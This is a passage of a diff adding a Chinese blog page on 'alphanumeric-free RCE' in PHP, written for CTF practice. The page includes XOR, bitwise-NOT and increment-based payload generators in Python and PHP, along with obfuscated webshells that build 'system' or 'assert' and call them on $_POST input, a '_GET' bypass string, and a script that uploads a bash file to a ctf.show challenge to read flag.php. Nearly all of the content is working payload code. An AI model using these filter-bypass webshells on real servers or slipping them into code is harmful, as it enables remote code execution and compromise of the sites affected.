class="variable">$___</span>.=~(小)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(次)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(站)[<span class="variable">$____</span>];<span class="variable">$____</span>=~(瞰)[<span class="variable">$____</span>];<span class="variable">$_</span>(<span class="variable">$$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="comment">//system($_POST[system]);</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="一代脚本"><a href="#一代脚本" class="headerlink" title="一代脚本"></a>一代脚本</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="comment">#!&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span></span><br><span class="line">answer = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;&quot;</span>))<span class="comment">#请输入进行异或构造的字符串</span></span><br><span class="line"></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">        tmp1 += i</span><br><span class="line">        tmp2 += j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tmp1为:&quot;</span>,tmp1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tmp2为:&quot;</span>,tmp2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload为:&quot;</span>+<span class="string">&quot;$_=&#x27;&quot;</span>+tmp1+<span class="string">&quot;&#x27;^&#x27;&quot;</span>+tmp2+<span class="string">&quot;&#x27;;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(33,127):</span></span><br><span class="line"><span class="comment">#     c=chr(i)</span></span><br><span class="line"><span class="comment">#     if not (c.isdigit() or c.isalpha()):</span></span><br><span class="line"><span class="comment">#         print(chr(i),end=&#x27;&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="二代脚本"><a href="#二代脚本" class="headerlink" title="二代脚本"></a>二代脚本</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $result1;</span></span><br><span class="line"><span class="comment">// echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="comment">// echo $result2;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$_=&#x27;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$result1</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&#x27;^&#x27;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$result2</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><h5 id="php5-re-php"><a href="#php5-re-php" class="headerlink" title="php5_re.php"></a>php5_re.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;system&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$ans2</span>=<span class="string">&#x27;dir&#x27;</span>;<span class="comment">//命令</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到system</span></span><br><span class="line"><span class="variable">$data2</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans2</span>));<span class="comment">//通过两次取反运算得到dir</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;$_=&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;);&#x27;</span>.<span class="string">&#x27;$__=(&#x27;</span>.<span class="variable">$data2</span>.<span class="string">&#x27;);&#x27;</span>.<span class="string">&#x27;;$_($__);&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="php7-re-php"><a href="#php7-re-php" class="headerlink" title="php7_re.php"></a>php7_re.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ans1</span>=<span class="string">&#x27;system&#x27;</span>;<span class="comment">//函数名</span></span><br><span class="line"><span class="variable">$ans2</span>=<span class="string">&#x27;dir&#x27;</span>;<span class="comment">//命令</span></span><br><span class="line"><span class="variable">$data1</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans1</span>));<span class="comment">//通过两次取反运算得到system</span></span><br><span class="line"><span class="variable">$data2</span>=(<span class="string">&#x27;~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$ans2</span>));<span class="comment">//通过两次取反运算得到dir</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data1</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="variable">$data2</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>除这些之外我们还可以这样用<code>${%86%86%86%86^%d9%c1%c3%d2}{%86}();&amp;%86=phpinfo</code>其中<code>&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</code>为构造出的<code>_GET</code>，适合于过滤了引号的情况下使用。</p>
+<h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.increment.php#language.operators.increment.string">PHP: 递增&#x2F;递减 - Manual</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260111222220723.png" alt="image-20260111222220624"></p>
+<p>获取字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">(<span class="number">0</span>/<span class="number">0</span>).<span class="string">&#x27;&#x27;</span>   <span class="comment">//NAN</span></span><br><span class="line">(<span class="number">1</span>/<span class="number">0</span>).<span class="string">&#x27;&#x27;</span>   <span class="comment">//INF</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里可以看出<code>NAN</code>表示的是未被定义的值，所以我们这里可以通过<code>a/a</code>这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如<code>_/_</code>，这个时候也可以得到<code>NAN</code>，同理，<code>INF</code>也可以通过<code>1/a</code>的方式获取。</p>
+</blockquote>
+<h5 id="php5"><a href="#php5" class="headerlink" title="php5"></a>php5</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">无字母数字webshell之提高篇 | 离别歌</a></p>
+<blockquote>
+<p>补充</p>
+<p>通配符又叫做 globbing patterns。因为 Unix 早期有一个<code>/etc/glob</code>文件保存通配符模板，后来 Bash 内置了这个功能，但是这个名字被保留了下来。</p>
+<p>通配符早于正则表达式出现，可以看作是原始的正则表达式。它的功能没有正则那么强大灵活，但是胜在简单和方便。</p>
+<p><a target="_blank" rel="noopener" href="https://ruanyifeng.com/blog/2018/09/bash-wildcards.html">命令行通配符教程 - 阮一峰的网络日志</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">glob风格通配符 - 简书</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#author yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://20f89f0a-f73c-426d-8770-7bb2c0ae943a.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;#!/bin/bash\ncat flag.php&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files,proxies=proxies)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br><span class="line"><span class="comment">#code为?&gt;&lt;?=`. /???/????????[@-[]`;?&gt; 根据实际情况调整</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce"><span class="toc-number">1.</span> <span class="toc-text">无字母数字rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">php可变函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5-php7%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">php5-&gt;php7的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#assert-%E6%96%AD%E8%A8%80%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">assert()断言函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%98%E9%87%8F%E5%A4%84%E7%90%86%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">关于变量处理的变化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php5-php7"><span class="toc-number">1.3.</span> <span class="toc-text">php5&#x2F;php7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E3%80%81%E6%88%96"><span class="toc-number">1.3.1.</span> <span class="toc-text">异或、或</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E5%8F%AF%E7%94%A8%E5%AD%97%E7%AC%A6%E7%9A%84%E9%9B%86%E5%90%88"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">生成可用字符的集合</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-php7-py"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">payload_php7.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-php5-py"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">payload_php5.py</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84%E5%BC%82%E6%88%96%E3%80%81%E6%88%96"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">可见字符的异或、或</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E4%BB%A3%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.1.4.1.</span> <span class="toc-text">一代脚本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BA%8C%E4%BB%A3%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.1.4.2.</span> <span class="toc-text">二代脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">取反</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php5-re-php"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">php5_re.php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php7-re-php"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">php7_re.php</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">1.3.3.</span> <span class="toc-text">自增</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php5"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">php5</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.</span> <span class="toc-text">临时文件</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&text=无字母数字rce"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&is_video=false&description=无字母数字rce"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无字母数字rce&body=Check out this article: http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&title=无字母数字rce"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&name=无字母数字rce&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/&t=无字母数字rce"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
